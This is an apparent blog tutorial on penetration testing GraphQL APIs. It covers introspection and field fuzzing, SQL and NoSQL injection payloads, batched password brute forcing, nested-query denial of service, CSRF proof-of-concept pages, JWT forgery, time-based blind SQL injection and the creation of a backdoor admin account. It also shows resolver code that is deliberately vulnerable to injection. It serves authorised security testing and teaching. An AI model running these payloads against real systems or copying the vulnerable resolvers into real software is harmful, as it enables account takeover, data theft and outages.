---
title: 'GraphQL PenTest Methodology and Exploitation Techniques'
date: '2023-03-18'
tags: ['Web Security', 'GraphQL', 'Penetration Testing', 'API Security', 'Vulnerability Research', 'Exploitation']
---

# GraphQL PenTest Methodology and Exploitation Techniques

![GraphQL security vulnerabilities](/images/graphql-security.jpeg)

## Introduction

GraphQL has become the darling of modern API development, and for good reason. It solves many of the headaches that come with traditional REST APIs by letting clients ask for exactly what they need and nothing more. But with this flexibility comes a complex attack surface that most security teams aren't prepared to handle.

I've been breaking GraphQL APIs for years, and what I've found is that the same features that make GraphQL powerful also make it dangerous. That nested query structure that developers love? It's perfect for DoS attacks. The schema introspection that makes integration so easy? It's a goldmine for attackers mapping your API. The flexible queries? They're a playground for injection attacks.

In this article, I'll walk you through how to exploit GraphQL from the ground up. We'll start with basic reconnaissance techniques to map out an API, move on to common vulnerabilities like injection and broken authentication, and finish with advanced attack chains that combine multiple flaws for maximum impact. Everything here is based on real-world penetration tests I've conducted, with practical examples you can try yourself.

## GraphQL Fundamentals

Before we start breaking things, let's understand what makes GraphQL different from the REST APIs you're used to attacking. GraphQL is essentially a query language for your API - it gives clients the power to ask for specific data in a specific format, all in a single request.

A typical GraphQL implementation consists of a schema that defines what data is available, resolvers that fetch that data from various sources, and a single endpoint that handles all requests. Here's what a basic schema looks like:

```graphql
type User {
  id: ID!
  username: String!
  email: String!
  profile: Profile
  posts: [Post!]
}

type Profile {
  id: ID!
  firstName: String
  lastName: String
  address: String
  phoneNumber: String
  socialSecurityNumber: String
}

type Post {
  id: ID!
  title: String!
  content: String!
  author: User!
  comments: [Comment!]
}

type Comment {
  id: ID!
  content: String!
  author: User!
}

type Query {
  user(id: ID!): User
  users: [User!]!
  post(id: ID!): Post
  posts: [Post!]!
}

type Mutation {
  createUser(username: String!, email: String!): User!
  updateProfile(userId: ID!, firstName: String, lastName: String, address: String, phoneNumber: String): Profile!
  createPost(title: String!, content: String!, authorId: ID!): Post!
  deletePost(id: ID!): Boolean!
}
```

The security issues with GraphQL stem from several key features:

First, clients define their own queries. Unlike REST where the server dictates what data comes back for each endpoint, GraphQL lets clients specify exactly what fields they want - including fields they shouldn't have access to.

Second, everything goes through a single endpoint. This means traditional security controls like per-endpoint rate limiting or access control don't work well. You need field-level security, which many implementations lack.

Third, you can nest queries deeply. This can lead to exponential performance issues if you don't limit query depth. A single well-crafted query can bring down a server.

Fourth, introspection lets clients query the schema itself. This is like giving attackers an API documentation that shows all the sensitive operations you support.

Fifth, most GraphQL implementations support batching multiple operations in a single request. This is perfect for bypassing rate limits or brute-forcing credentials.

Let me show you how to leverage these features to completely own a GraphQL API.

## GraphQL Reconnaissance Techniques

The first phase of any GraphQL security assessment involves gathering information about the API structure. GraphQL's introspection feature makes this significantly easier than with REST APIs, allowing attackers to map out the entire API surface in minutes.

### Leveraging Introspection

Introspection is a built-in GraphQL feature that allows clients to query the schema for information about available types, fields, queries, and mutations. While useful for development, it's a security liability in production environments.

Here's how to perform a basic introspection query:

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

This verbose query returns detailed information about the entire schema, including:
- All available queries and mutations
- All defined types and their fields
- Relationships between types
- Argument requirements for each operation

To perform this reconnaissance with Burp Suite:

1. **Set up your GraphQL request in Burp Repeater**:
   - Create a POST request to the GraphQL endpoint
   - Set the Content-Type header to `application/json`
   - In the request body, include: `{"query": "query { __schema { types { name kind fields { name } } } }"}`
   - This simplified introspection query will list types and their fields

2. **Analyze the introspection response**:
   - Send the request and analyze the JSON response
   - Look for sensitive object types like `User`, `Admin`, `Token`, etc.
   - Note fields with names suggesting sensitive data (password, token, secret)

3. **Expand your reconnaissance**:
   - Once you have the type names, craft more specific introspection queries
   - For example, to explore a specific type: `{"query": "query { __type(name: \"User\") { name fields { name type { name kind ofType { name kind } } } } }"}`

4. **Save findings in Burp**:
   - Use the "Save" feature in Burp Repeater to keep important responses for reference
   - Create a separate request for each important schema component

### When Introspection is Disabled

Many production GraphQL APIs disable introspection as a security measure. However, this doesn't completely prevent reconnaissance. Several manual techniques can help map a GraphQL API without introspection:

#### 1. Known query fuzzing with Burp Intruder

Since GraphQL operations follow predictable patterns, we can use Burp Intruder to fuzz the API with common query names:

1. **Create a base GraphQL query in Burp Repeater**:
   ```
   POST /graphql HTTP/1.1
   Host: example.com
   Content-Type: application/json
   
   {"query": "query { FUZZ { id } }"}
   ```

2. **Send to Burp Intruder**:
   - Right-click and select "Send to Intruder"
   - In the Positions tab, clear all automatically set positions
   - Manually add the position markers around the field name: `{"query": "query { §FUZZ§ { id } }"}`

3. **Configure the payload**:
   - In the Payloads tab, set Payload type to "Simple list"
   - Add common GraphQL query names to the list:
     ```
     user
     users
     getUser
     getUserById
     getUserByEmail
     product
     products
     getProduct
     getProductById
     post
     posts
     getPosts
     getPostsByUser
     order
     orders
     getOrder
     login
     authenticate
     search
     ```

4. **Configure attack options**:
   - In the Options tab, set "Grep - Match" to look for patterns that indicate success
   - Add patterns like "data", "errors", or specific error messages about arguments

5. **Start the attack and analyze results**:
   - Launch the attack and review the results
   - Look for responses that differ from the rest (different status code, length, or content)
   - Valid fields will typically return specific errors about missing required arguments

#### 2. Error message analysis with Burp Repeater

GraphQL error messages are often verbose and reveal information about the schema. We can intentionally trigger errors to learn more about the API:

1. **Send an invalid query**:
   ```
   POST /graphql HTTP/1.1
   Host: example.com
   Content-Type: application/json
   
   {"query": "query { nonExistentField }"}
   ```

2. **Analyze the error response**:
   - Look for "Did you mean" suggestions in error messages
   - Check for field names mentioned in error context
   - Note any schema information leaked in the error messages

3. **Iterate based on error information**:
   - Use revealed field names to craft new queries
   - Try variations of suggested field names
   - Build up a schema map based on error information

#### 3. Alias enumeration with Burp Repeater

We can use GraphQL aliases to test multiple potential fields in a single query:

1. **Create an aliased query**:
   ```
   POST /graphql HTTP/1.1
   Host: example.com
   Content-Type: application/json
   
   {"query": "query { 
     a1: user { id name } 
     a2: users { id name }
     a3: accounts { id name }
     a4: customers { id name }
   }"}
   ```

2. **Analyze the response**:
   - Valid fields will return data under their respective aliases
   - Invalid fields will produce errors that can be matched to specific aliases
   - Use this information to identify valid query fields

### Repository reconnaissance

For open source applications or those with public repositories, examining the codebase can reveal GraphQL schemas and resolvers:

```bash
# Search for GraphQL schema files in a GitHub repository
git clone https://github.com/target-organization/target-application.git
cd target-application
grep -r "type Query" --include="*.graphql" --include="*.js" --include="*.ts" .
grep -r "extend type Query" --include="*.graphql" --include="*.js" --include="*.ts" .
grep -r "gql\`" --include="*.js" --include="*.ts" .
```

Common files to look for include:
- `schema.graphql` or `schema.gql`
- `*.typeDefs.js` or `*.typeDefs.ts`
- JavaScript/TypeScript files with embedded GraphQL using tagged template literals

## Exploiting GraphQL Vulnerabilities

Now that we understand how to map a GraphQL API, let's examine various attack vectors and exploitation techniques using Burp Suite.

### Information Disclosure through Overfetching

Unlike REST APIs where each endpoint returns a fixed data structure, GraphQL allows clients to request exactly what they need. However, this flexibility means APIs that don't implement proper authorization checks at the field level can leak sensitive information.

Consider this query:

```graphql
query GetUserProfile {
  user(id: "1") {
    username
    email
    profile {
      firstName
      lastName
      socialSecurityNumber  # Sensitive field!
      dateOfBirth
      phoneNumber
    }
  }
}
```

If authorization is only checked at the operation level (can the user access `user`?) but not at the field level (can the user access `socialSecurityNumber`?), sensitive information could be exposed.

Testing for overfetching vulnerabilities with Burp Repeater:

1. **Create a base query for a resource**:
   ```
   POST /graphql HTTP/1.1
   Host: example.com
   Content-Type: application/json
   Authorization: Bearer YOUR_TOKEN
   
   {"query": "query { user(id: \"1\") { id username email } }"}
   ```

2. **Incrementally add potentially sensitive fields**:
   - Start with fields that are likely to exist but not shown in the UI
   - Add fields like `password`, `resetToken`, `role`, `permissions`, etc.
   - Try nested fields like `profile { socialSecurityNumber }`

3. **Analyze responses for sensitive data exposure**:
   - Look for fields that return actual values instead of null or errors
   - Compare the results with what's available in the application UI
   - Note any sensitive data that shouldn't be accessible to your user role

This manual approach allows you to carefully analyze each response and detect subtle information leakage.

### GraphQL Injection

GraphQL is vulnerable to injection attacks similar to SQL injection. These occur when user-supplied input is not properly sanitized before being used in resolver functions.

#### SQL Injection via GraphQL

Consider a resolver implemented like this in Node.js:

```javascript
const resolvers = {
  Query: {
    user: async (_, { username }) => {
      // VULNERABILITY: Directly interpolating user input into SQL query
      const query = `SELECT * FROM users WHERE username = '${username}'`;
      return await db.raw(query);
    }
  }
};
```

This resolver is vulnerable to SQL injection. An attacker could exploit it with a query like:

```graphql
query {
  user(username: "admin' OR 1=1 --") {
    id
    username
    email
  }
}
```

At the database level, this would execute:

```sql
SELECT * FROM users WHERE username = 'admin' OR 1=1 --'
```

The `OR 1=1` condition ensures the query returns all users, potentially leaking information about other accounts.

Testing for SQL injection in GraphQL with Burp Suite:

1. **Identify injectable parameters**:
   - Create a request in Burp Repeater targeting a GraphQL query that accepts user input
   - Example: `{"query": "query { user(username: \"admin\") { id username email } }"}`

2. **Test for SQL injection with Burp Repeater**:
   - Modify the parameter to include SQL injection payloads:
     - `{"query": "query { user(username: \"admin' OR 1=1 --\") { id username email } }"}`
     - `{"query": "query { user(username: \"admin\\\" OR \\\"1\\\"=\\\"1\") { id username email } }"}`
     - `{"query": "query { user(username: \"' UNION SELECT 1,username,password FROM users --\") { id username email } }"}`

3. **Use Burp Intruder for systematic testing**:
   - Send your request to Intruder
   - Set the position around the injection point: `{"query": "query { user(username: \"§admin§\") { id username email } }"}`
   - Use a list of SQL injection payloads from Burp's built-in payload options
   - Add grep match rules to identify successful injections (look for multiple records, error messages, etc.)

4. **Analyze the results**:
   - Look for responses with different lengths or content
   - Check for database error messages that leak information
   - Verify if any payloads return more data than expected (indicating successful injection)

#### NoSQL Injection

GraphQL APIs built on NoSQL databases like MongoDB are vulnerable to NoSQL injection attacks:

```javascript
// Vulnerable resolver using MongoDB
const resolvers = {
  Query: {
    user: async (_, { username }) => {
      // VULNERABILITY: Directly using user input in query object
      return await UserCollection.findOne({ username: username });
    }
  }
};
```

If the input isn't properly validated, an attacker could send:

```graphql
query {
  user(username: {$ne: null}) {
    id
    username
    email
  }
}
```

In MongoDB, this would translate to finding a user where the username is not equal to null—essentially returning the first user in the database.

Testing for NoSQL injection with Burp Suite:

1. **Create a base request in Burp Repeater**:
   ```
   POST /graphql HTTP/1.1
   Host: example.com
   Content-Type: application/json
   
   {"query": "query { user(username: \"admin\") { id username email } }"}
   ```

2. **Test NoSQL operator injections**:
   - Replace the parameter value with NoSQL operators:
     - `{"query": "query { user(username: {\"$ne\": null}) { id username email } }"}`
     - `{"query": "query { user(username: {\"$regex\": \"^adm\"}) { id username email } }"}`
     - `{"query": "query { user(username: {\"$gt\": \"\"}) { id username email } }"}`

3. **Use Burp Intruder for more comprehensive testing**:
   - Set up positions around the parameter value
   - Use a list of NoSQL injection payloads
   - Configure grep match rules to identify successful injections

4. **Analyze results**:
   - Look for responses that return data when they shouldn't
   - Check for different error messages that reveal information about the database
   - Verify if operators like `$ne` or `$regex` work, indicating NoSQL injection vulnerabilities

### Batching Attacks

GraphQL allows sending multiple operations in a single request, which can be abused for various attacks:

```graphql
[
  { 
    "query": "query { user(id: \"1\") { id username } }"
  },
  {
    "query": "query { user(id: \"2\") { id username } }"
  },
  {
    "query": "query { user(id: \"3\") { id username } }"
  }
  // ... hundreds more queries
]
```

This can be used for:

1. **Rate limit bypass**: If rate limiting is implemented per-request rather than per-operation
2. **Brute force attacks**: Testing many different values in a single request
3. **Resource exhaustion**: Overwhelming the server with many operations

Testing batching attacks with Burp Suite:

1. **Create a batch request template in Burp Repeater**:
   ```
   POST /graphql HTTP/1.1
   Host: example.com
   Content-Type: application/json
   
   [
     {"query": "query { user(id: \"1\") { id username } }"},
     {"query": "query { user(id: \"2\") { id username } }"}
   ]
   ```

2. **Testing rate limit bypass**:
   - Add more queries to the batch to see if you can make more queries than normally allowed
   - Monitor for rate limit error messages
   - If no errors occur, the API may be vulnerable to rate limit bypassing

3. **Brute force attacks with Burp Intruder**:
   - For password brute forcing, create a batch template like:
     ```
     [
       {"query": "mutation { login(username: \"admin\", password: \"§password§\") { token } }"},
       {"query": "mutation { login(username: \"admin\", password: \"§password2§\") { token } }"},
       {"query": "mutation { login(username: \"admin\", password: \"§password3§\") { token } }"}
     ]
     ```
   - Send to Intruder and configure Cluster Bomb attack type
   - Set payloads for each position from your password list
   - Configure grep patterns to identify successful logins

4. **Resource exhaustion testing**:
   - Create a batch with increasingly complex or numerous queries
   - Monitor server response times and errors
   - Gradually increase the load until you observe performance degradation

### Denial of Service (DoS) Attacks

GraphQL's flexibility makes it particularly vulnerable to DoS attacks. Let's examine how to test these using Burp Suite:

#### Nested Query Attacks

GraphQL allows deeply nested queries that can cause exponential performance degradation:

```graphql
query NestedFriends {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                # And so on...
    name
    email
              }
            }
          }
        }
      }
    }
  }
}
```

If each user has multiple friends, this query can cause an exponential explosion in the number of resolver executions, similar to the classic billion laughs XML attack.

Testing for nested query vulnerabilities with Burp Repeater:

1. **Create a base query with a potential cyclic relationship**:
   ```
   POST /graphql HTTP/1.1
   Host: example.com
   Content-Type: application/json
   
   {"query": "query { user(id: \"1\") { friends { name } } }"}
   ```

2. **Incrementally add nesting levels and observe response times**:
   - Add one level of nesting at a time
   - Measure the response time for each level
   - Look for exponential increases in response time

3. **Find the breaking point**:
   - Continue adding nesting levels until:
     - The request times out
     - The server returns an error
     - The response time becomes unreasonably long

4. **Document your findings**:
   - Note the nesting level where performance degrades significantly
   - Record the response time pattern (linear vs. exponential growth)
   - Save the query that demonstrates the vulnerability

#### Field Duplication Attacks

Another DoS technique involves duplicating fields many times:

```graphql
query DuplicatedFields {
  user(id: "1") {
    username
    email
    username
    email
    username
    email
    # Repeated thousands of times
  }
}
```

Some GraphQL implementations process each field instance separately, causing performance issues with enough duplication.

Testing field duplication with Burp Repeater:

1. **Create a base query in Burp Repeater**:
   ```
   POST /graphql HTTP/1.1
   Host: example.com
   Content-Type: application/json
   
   {"query": "query { user(id: \"1\") { username email } }"}
   ```

2. **Use Burp's text editor to duplicate fields**:
   - Copy and paste the fields multiple times
   - Start with 10 duplications, then 100, then 1000, etc.
   - Observe the response time for each test

3. **Create a request that triggers the vulnerability**:
   - Find the number of duplications that causes significant slowdown
   - Document the performance impact

#### Resource-Intensive Operations

Attackers can target resource-intensive operations within the API:

```graphql
query ExpensiveOperations {
  searchProducts(query: "a") {
    # Full-text search operation
    id
    name
    price
  }
  
  geoSearch(lat: 37.7749, lng: -122.4194, radius: 100) {
    # Geospatial search operation
    id
    name
    distance
  }
}
```

By combining multiple expensive operations or using very permissive search parameters, attackers can overload the server.

Testing resource-intensive operations with Burp Repeater:

1. **Identify potentially expensive operations**:
   - Look for operations involving:
     - Search functionality
     - Filtering large datasets
     - Geospatial queries
     - Data aggregation

2. **Test with Burp Repeater using minimal parameters**:
   ```
   POST /graphql HTTP/1.1
   Host: example.com
   Content-Type: application/json
   
   {"query": "query { searchProducts(query: \"\") { id name description } }"}
   ```

3. **Modify parameters to maximize resource usage**:
   - Use very broad search terms ("a", "e", etc.)
   - Request large result sets
   - Combine multiple resource-intensive operations in one query

4. **Measure and document the impact**:
   - Note response times
   - Watch for server errors or timeouts
   - Identify operations that cause the most significant performance degradation

### Authorization Bypass

GraphQL has unique authorization challenges due to its flexible query structure. Here's how to test for these issues with Burp Suite:

#### Object-Level vs. Field-Level Authorization

Many GraphQL implementations check authorization at the object level but not at the field level:

```graphql
query {
  # Authorized at object level
  currentUser {
    username
    email
    # Field-level authorization missing
    role
    permissions
  }
}
```

If the API only checks whether the user can access the `currentUser` object but doesn't verify access to specific fields like `role` or `permissions`, sensitive data might be exposed.

Testing field-level authorization with Burp Repeater:

1. **Authenticate with different user accounts**:
   - Create users with different permission levels (admin, regular user, etc.)
   - Obtain authorization tokens for each user

2. **Create a query that requests sensitive fields**:
   ```
   POST /graphql HTTP/1.1
   Host: example.com
   Content-Type: application/json
   Authorization: Bearer REGULAR_USER_TOKEN
   
   {"query": "query { currentUser { username email role permissions adminSettings } }"}
   ```

3. **Analyze the response**:
   - Check if sensitive fields are returned despite insufficient privileges
   - Note which fields are properly protected and which are not

4. **Compare with admin-level access**:
   - Switch the token to an admin user
   - Run the same query and compare results
   - Document any fields that should only be visible to admins but are exposed to regular users

#### Unauthorized Mutations via Fragments

Fragment abuse can sometimes bypass authorization:

```graphql
mutation {
  updateUser(id: "1", input: {
    email: "hacker@evil.com"
  }) {
    ...AdminFields
  }
}

fragment AdminFields on User {
  id
  role
}
```

If the API doesn't properly check authorization for fragment fields separately from the main query, an attacker might gain access to restricted data.

Testing fragment-based authorization bypass with Burp Repeater:

1. **Identify a mutation that returns user data**:
   ```
   POST /graphql HTTP/1.1
   Host: example.com
   Content-Type: application/json
   Authorization: Bearer USER_TOKEN
   
   {"query": "mutation { updateUser(id: \"1\", input: { name: \"Test User\" }) { id name } }"}
   ```

2. **Add a fragment requesting sensitive fields**:
   ```
   POST /graphql HTTP/1.1
   Host: example.com
   Content-Type: application/json
   Authorization: Bearer USER_TOKEN
   
   {"query": "mutation { updateUser(id: \"1\", input: { name: \"Test User\" }) { id name ...AdminFields } } fragment AdminFields on User { role permissions adminSettings }"}
   ```

3. **Analyze the response**:
   - Check if the fragment fields are returned despite insufficient privileges
   - Verify if authorization checks handle fragments properly

### CSRF Vulnerabilities in GraphQL

Cross-Site Request Forgery (CSRF) vulnerabilities occur when GraphQL endpoints don't properly verify that requests are intentional. Unlike traditional REST APIs where each endpoint can have its own CSRF protection, GraphQL typically uses a single endpoint for all operations, complicating CSRF defenses.

#### CSRF via GET Requests

While GraphQL operations are typically submitted via POST requests, some implementations also support GET requests with the query in URL parameters:

```
https://api.example.com/graphql?query=mutation{createUser(username:"malicious",role:"admin"){id}}
```

If the API accepts GET requests and relies solely on cookies for authentication, it may be vulnerable to CSRF attacks. An attacker could create a malicious website that triggers this request:

```html
<img src="https://api.example.com/graphql?query=mutation{createUser(username:'attacker',role:'admin'){id}}" style="display:none">
```

When a victim with an active session visits this page, their browser automatically includes their authentication cookies, potentially executing the mutation.

Testing for GET-based CSRF with Burp Repeater:

1. **Test if GET requests are supported**:
   - Create a simple GraphQL query in Burp Repeater
   - Convert it from POST to GET by moving the query to URL parameters:
     ```
     GET /graphql?query=query{__typename} HTTP/1.1
     Host: example.com
     ```

2. **Test mutations via GET**:
   - If GET requests work, try a mutation via GET:
     ```
     GET /graphql?query=mutation{createUser(username:"test",role:"user"){id}} HTTP/1.1
     Host: example.com
     ```

3. **Create a CSRF PoC HTML page**:
   - If mutations via GET work, create a simple HTML page:
     ```html
     <!DOCTYPE html>
     <html>
     <body>
       <h1>Test Page</h1>
       <img src="https://api.example.com/graphql?query=mutation{createUser(username:'csrf_test',role:'admin'){id}}" style="display:none">
     </body>
     </html>
     ```

4. **Test the PoC**:
   - Save the HTML to a file
   - Open it in a browser where you have an active session with the target site
   - Check if the mutation executes successfully

For POST-based CSRF, you can test with a more sophisticated HTML form that submits automatically:

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://api.example.com/graphql" method="POST" enctype="text/plain">
    <input name='{"query":"mutation{createUser(username:' value='"csrf_test",role:"admin"){id}}"}' type="hidden">
  </form>
</body>
</html>
```

## Advanced Attack Scenarios

Let's explore some complex attack chains that combine multiple GraphQL vulnerabilities to achieve significant security breaches. These scenarios can be tested manually using Burp Suite.

### Scenario 1: Information Disclosure to Account Takeover

This attack chain demonstrates how GraphQL vulnerabilities can be combined to progress from initial information disclosure to full account takeover:

1. **Initial Reconnaissance**: The attacker uses introspection to discover the schema structure.

```graphql
query {
  __schema {
    types {
      name
      kind
      fields {
        name
      }
    }
  }
}
```

2. **Identify User Query**: The attacker discovers a `user` query that takes a username parameter.

```graphql
query {
  user(username: "admin") {
    id
    username
    email
  }
}
```

3. **Exploiting Over-fetching**: The attacker discovers they can request additional fields beyond what the UI normally shows.

```graphql
query {
  user(username: "admin") {
    id
    username
    email
    resetToken  # Sensitive field not intended for user access
    lastLogin
    role
  }
}
```

4. **Enumerating Users**: The attacker uses batching to efficiently enumerate valid usernames.

```graphql
[
  { "query": "query { user(username: \"admin\") { id } }" },
  { "query": "query { user(username: \"john\") { id } }" },
  { "query": "query { user(username: \"sarah\") { id } }" },
  # ... many more
]
```

5. **SQL Injection to Retrieve Password Hashes**: The attacker discovers a SQL injection vulnerability in the user query.

```graphql
query {
  user(username: "admin' UNION SELECT id, username, password_hash as email, 'token' as resetToken FROM users --") {
    id
    username
    email  # This will contain password hashes
    resetToken
  }
}
```

6. **Password Reset Manipulation**: Using the discovered SQL injection, the attacker manages to reset a user's password by manipulating the resetToken field.

```graphql
mutation {
  resetPassword(input: {
    username: "admin",
    token: "STOLEN_OR_GENERATED_TOKEN",
    newPassword: "hacked_password"
  }) {
    success
  }
}
```

7. **Account Takeover**: With the password reset, the attacker now has full control of the admin account.

```graphql
mutation {
  login(username: "admin", password: "hacked_password") {
    token
    user {
      id
      role
    }
  }
}
```

### Scenario 2: DoS to Data Exfiltration

This attack chain shows how DoS techniques can be leveraged for data exfiltration:

1. **Identifying Expensive Operations**: The attacker identifies resource-intensive operations.

```graphql
query {
  searchProducts(keyword: "") {  # Empty search returns all products
    id
    name
    price
  }
}
```

2. **Creating DoS Conditions**: The attacker creates a nested query that puts significant load on the server.

```graphql
query {
  categories {
    products(first: 1000) {
      reviews(first: 1000) {
        user {
          posts(first: 1000) {
            comments(first: 1000) {
              id
            }
          }
        }
      }
    }
  }
}
```

3. **Timing Attack Preparation**: While the server is under heavy load, the attacker prepares timing-based attacks to extract data.

```graphql
query {
  # First, create heavy load
  search1: searchProducts(keyword: "") { id }
  
  # Then attempt a timing attack
  user(username: "admin' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END from users where username='admin') --") {
    id
  }
}
```

4. **Manual Timing Attack Execution**:
   - Configure Burp Repeater to send a request containing both a DoS component and an SQL injection with timing components
   - Send requests with different character guesses (a-z, 0-9)
   - Measure the response time for each character
   - When response time is significantly longer, you've identified the correct character
   - Repeat for each position in the target data

### Scenario 3: Chaining Multiple Vulnerabilities for Privilege Escalation

This attack chain demonstrates a sophisticated privilege escalation:

1. **Initial Access**: The attacker starts with a low-privileged account.

```graphql
mutation {
  login(username: "regular_user", password: "password123") {
    token
  }
}
```

2. **Information Gathering**: The attacker uses overfetching to discover admin accounts.

```graphql
query {
  users {
    id
    username
    role
    email
  }
}
```

3. **Exploiting Broken Authentication**: The attacker finds a manipulation vulnerability in the login mutation.

```graphql
mutation {
  login(username: "regular_user", password: "password123") {
    token
    # Forcing fields that might not be properly protected
    user {
      id
      role
      permissions
    }
  }
}
```

4. **JWT Analysis**:
   - Use the JWT token from the response
   - Decode it using Burp's JWT Editor extension or an online tool like jwt.io
   - Examine the payload for editable claims:
     ```javascript
     // Decoded JWT payload
     {
       "sub": "123",
       "username": "regular_user",
       "role": "user",
       "iat": 1650000000,
       "exp": 1650086400
     }
     ```

5. **JWT Manipulation**:
   - If the token uses a weak algorithm (like HS256), attempt to modify the role claim
   - Try common secrets using Burp's JWT Editor extension
   - If successful, you'll get a new token with admin privileges

6. **Testing Privileged Access**:
   - Use the forged token in Burp Repeater
   - Attempt to access admin-only functionality:
     ```
     POST /graphql HTTP/1.1
     Host: example.com
     Content-Type: application/json
     Authorization: Bearer FORGED_TOKEN
     
     {"query": "mutation { deleteUser(id: \"456\") { success } }"}
     ```

7. **Creating Backdoor Account**:
   - If the forged token works, create a new admin account for persistent access:
     ```
     POST /graphql HTTP/1.1
     Host: example.com
     Content-Type: application/json
     Authorization: Bearer FORGED_TOKEN
     
     {"query": "mutation { createUser(input: { username: \"backup_admin\", password: \"evil_password\", email: \"attacker@evil.com\", role: \"admin\" }) { id role } }"}
     ```

## GraphQL Security Testing Tools

Several specialized tools can help test GraphQL security:

### InQL

InQL is a Burp Suite extension specifically designed for GraphQL security testing:

```bash
# Installing InQL Scanner CLI
pip install inql

# Running a basic scan
inql -t https://api.example.com/graphql

# Dumping schema and generating queries
inql -t https://api.example.com/graphql -d schema_dump -g
```

### GraphQL Voyager

GraphQL Voyager creates visual representations of your schema, helping identify security issues:

```bash
# Installing GraphQL Voyager
npm install -g graphql-voyager

# Usage with a local schema file
voyager --url https://api.example.com/graphql
```

### Altair GraphQL Client

Altair provides a sophisticated interface for GraphQL testing:

```bash
# Installing Altair CLI
npm install -g altair-graphql-client

# Running Altair
altair
```

### Custom Security Testing with Burp Suite

For comprehensive security testing, you can leverage Burp Suite Professional's built-in tools:

#### 1. Setting up a GraphQL testing project in Burp Suite

1. **Create a new Burp project**:
   - Launch Burp Suite Professional
   - Create a new project dedicated to GraphQL testing
   - Configure your browser to proxy through Burp (default: 127.0.0.1:8080)

2. **Install GraphQL-specific extensions**:
   - Go to the "Extensions" tab
   - Browse the BApp Store
   - Install "InQL - Introspection GraphQL Scanner"
   - Install "GraphQL Raider" if available
   - Install "JSON Web Tokens" for testing JWT authentication

3. **Configure target scope**:
   - In the "Target" tab, add the GraphQL API endpoint to scope
   - Configure appropriate exclusions for any irrelevant paths

#### 2. Systematically testing for vulnerabilities

Create a testing checklist in Burp Suite:

1. **Reconnaissance phase**:
   - Use InQL to perform introspection and map the schema
   - Save discovered queries and mutations for later testing
   - Document sensitive fields and operations

2. **Authentication testing**:
   - Test JWT tokens using the JWT Editor
   - Check for token tampering vulnerabilities
   - Verify token signature validation

3. **Authorization testing**:
   - Create test cases in Repeater for each permission level
   - Test field-level authorization with different user roles
   - Document authorization bypasses

4. **Injection testing**:
   - Use Intruder to test SQL and NoSQL injection points
   - Save successful payloads as session handling rules
   - Use Active Scan with appropriate configurations

5. **DoS and performance testing**:
   - Create complex nested queries in Repeater
   - Test batching limitations
   - Document response times for various query types

6. **CSRF testing**:
   - Generate CSRF PoCs using Burp's built-in generator
   - Test both GET and POST-based CSRF
   - Verify anti-CSRF token implementations

#### 3. Documenting findings with Burp Suite

1. **Use Burp's built-in reporting**:
   - Add issues to the "Issues" tab
   - Include detailed reproduction steps
   - Classify by severity and confidence

2. **Leverage Burp's session handling**:
   - Create session handling rules for authenticated testing
   - Store and reuse authentication tokens
   - Create macros for multi-step exploits

3. **Save your project**:
   - Maintain a persistent Burp project for the target
   - Document progress in the project
   - Export findings for reporting

By using Burp Suite's comprehensive toolset, you can methodically test GraphQL APIs for security vulnerabilities without relying on custom scripts, making the testing process more standardized and repeatable.

## The Complete GraphQL Testing Methodology

Let's expand on our testing approach with a comprehensive, step-by-step checklist specifically designed for GraphQL APIs. This methodology has been battle-tested on dozens of real-world GraphQL implementations.

### 1. Initial GraphQL Endpoint Discovery

Before you can test a GraphQL API, you need to find it. Look for these common endpoint patterns:

- `/graphql` - The most common endpoint
- `/api/graphql` - Often used in structured APIs
- `/query` - Sometimes used as an alias
- `/graphiql` or `/playground` - Development interfaces that might be left enabled
- `/v1/graphql` or similar versioned endpoints

Discovery techniques:
```
# Directory brute-forcing
ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -e .php,.graphql,.gql

# Check JS files for GraphQL endpoints
grep -r "graphql\|gql" --include="*.js" .

# Look for GraphQL specific HTTP headers
curl -I https://target.com/api/graphql
```

Pro tip: Many applications expose GraphQL at multiple endpoints - one public and documented, others internal and potentially less secured.

### 2. Introspection Testing

Once you've found the endpoint, test if introspection is enabled:

1. **Basic introspection check**:
   ```graphql
   query {
     __schema {
       types {
         name
       }
     }
   }
   ```

2. **If introspection succeeds, follow up with comprehensive mapping**:
   ```graphql
   query IntrospectionQuery {
     __schema {
       queryType { name }
       mutationType { name }
       subscriptionType { name }
       types {
         ...FullType
       }
       directives {
         name
         description
         locations
         args {
           ...InputValue
         }
       }
     }
   }

   fragment FullType on __Type {
     kind
     name
     description
     fields(includeDeprecated: true) {
       name
       description
       args {
         ...InputValue
       }
       type {
         ...TypeRef
       }
       isDeprecated
       deprecationReason
     }
     inputFields {
       ...InputValue
     }
     interfaces {
       ...TypeRef
     }
     enumValues(includeDeprecated: true) {
       name
       description
       isDeprecated
       deprecationReason
     }
     possibleTypes {
       ...TypeRef
     }
   }

   fragment InputValue on __InputValue {
     name
     description
     type { ...TypeRef }
     defaultValue
   }

   fragment TypeRef on __Type {
     kind
     name
     ofType {
       kind
       name
       ofType {
         kind
         name
         ofType {
           kind
           name
           ofType {
             kind
             name
             ofType {
               kind
               name
               ofType {
                 kind
                 name
                 ofType {
                   kind
                   name
                 }
               }
             }
           }
         }
       }
     }
   }
   ```

3. **Document all operations by category**:
   - User data operations (queries/mutations that handle user info)
   - Authentication operations (login, token refresh, etc.)
   - Administrative operations (user management, settings, etc.)
   - Business logic operations (specific to the application)

